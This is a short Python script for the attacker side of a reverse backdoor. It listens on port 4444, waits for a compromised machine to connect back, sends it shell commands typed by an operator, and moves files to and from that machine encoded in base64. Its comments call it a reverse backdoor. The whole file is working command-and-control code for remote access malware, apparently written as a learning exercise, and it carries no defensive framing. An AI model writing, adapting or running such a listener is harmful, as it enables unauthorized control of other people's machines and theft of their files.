#!/usr/bin/env python3
import socket, json, base64



class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # this option allow to reuse socket if connection drops
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # the add and port of the target machine that uses reverse backdoor
        listener.bind((ip, port))
        # the option 0 define how many connections can be queued
        listener.listen(0)
        print("[+] Waiting for a connection")
        self.connection, address = listener.accept()
        print("[+] Waiting for a connection from " + str(address))

    def execute_remote(self,command):
        self.serial_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.serial_receive()

    def serial_send(self,data):
        # serialization of data using json
        json_data=json.dumps(data)
        # encoded as bytes
        self.connection.send(json_data.encode())

    def serial_receive(self):
        # convert to byte
        json_data=b""
        # receive data as json
        # receive data until err occurs because data is incomplete the continue until data is complete
        while True:
            try:

                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def write_file(self,path, content):
        with open(path,"wb") as file:
            file.write(base64.b64decode( content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        # send commands and receive the result of the command
        while True:
            command=input(">>> ")
            command=command.split(" ")
            try:
                if command[0]== "upload":
                    file_content=self.read_file(command[1]).decode()
                    command.append(file_content)
                result=self.execute_remote(command)

                if command[0]=="download"  and "[+] Error" not in result:
                    result=self.write_file(command[1],result)

            except Exception:
                result="[+] Error during command exec"
            print(result)

my_listener=Listener("ip",4444)
my_listener.run()